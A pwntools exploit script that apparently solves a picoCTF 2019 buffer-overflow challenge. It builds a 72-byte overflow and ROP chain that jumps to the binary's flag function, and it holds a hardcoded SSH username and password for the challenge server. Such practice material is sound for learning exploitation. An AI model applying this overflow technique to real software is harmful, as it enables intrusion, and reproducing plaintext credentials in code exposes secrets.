from pwn import *

def exploit():
    #p = process("./vuln")
    s = ssh(host='2019shell1.picoctf.com', user='ChaaO', password='kmz317xe92')
    p = s.process("vuln", cwd="/problems/newoverflow-2_0_b7d9b3bbdbb843a28a13ff1aa57410df")
    binary = ELF("vuln")
    
    poprs = 0x000000000040099c
    padding = 72
    flag = binary.symbols["flag"]

    payload = ""
    payload += "A" * padding
    payload += p64(poprs)
    payload += p64(0x400680)
    payload += p64(0x1)
    payload += p64(0)
    payload += p64(0)
    payload += p64(flag)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
#python -c "from pwn import *;print 'A' * 72 + p64(0x000000000040099c) + p64(0x400680) + p64(0x1) + p64(0) + p64(0) + p64(0x000000000040084d)" | ./vuln 
                                            # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret